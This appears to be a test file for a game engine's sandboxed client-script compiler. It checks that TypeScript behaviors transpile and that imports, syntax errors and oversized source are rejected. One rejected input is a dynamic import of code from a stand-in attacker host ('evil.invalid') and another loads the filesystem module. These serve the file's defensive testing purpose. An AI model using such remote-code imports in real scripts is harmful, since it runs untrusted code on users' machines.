import assert from 'node:assert/strict';
import test from 'node:test';
import { compileClientScript } from '../src/client-script/compiler.js';

test('transpiles an isolated TypeScript behavior module', () => {
  const result = compileClientScript(`export default {
    onStart(ctx: BornEngineScriptContext) { ctx.log?.('ready'); },
    update(dt: number, ctx: BornEngineScriptContext) { ctx.particles?.emitBurst(2, dt, 0); },
  };`);

  assert.equal(result.ok, true);
  if (result.ok) {
    assert.match(result.javascript, /export default/);
    assert.doesNotMatch(result.javascript, /BornEngineScriptContext/);
    assert.match(result.javascript, /emitBurst/);
  }
});

test('rejects all static and dynamic module loading', () => {
  for (const source of [
    `import { Game } from '@bornengine/engine'; export default {};`,
    `export { Game } from '@bornengine/engine'; export default {};`,
    `export default { onStart() { import('https://evil.invalid/x.js'); } };`,
    `export default { onStart() { require('node:fs'); } };`,
  ]) {
    const result = compileClientScript(source);
    assert.equal(result.ok, false);
    if (!result.ok) assert.match(result.diagnostics.join('\n'), /imports|module loading/i);
  }
});

test('rejects TypeScript syntax diagnostics', () => {
  const result = compileClientScript('export default { onStart( {');
  assert.equal(result.ok, false);
  if (!result.ok) assert.match(result.diagnostics.join('\n'), /error/i);
});

test('requires one default behavior object', () => {
  assert.equal(compileClientScript('const value = 1;').ok, false);
  assert.equal(compileClientScript('export default 42;').ok, false);
});

test('rejects source larger than 64 KiB', () => {
  const result = compileClientScript(`export default {};\n//${'x'.repeat(64 * 1024)}`);
  assert.equal(result.ok, false);
  if (!result.ok) assert.match(result.diagnostics.join('\n'), /64 KiB/i);
});
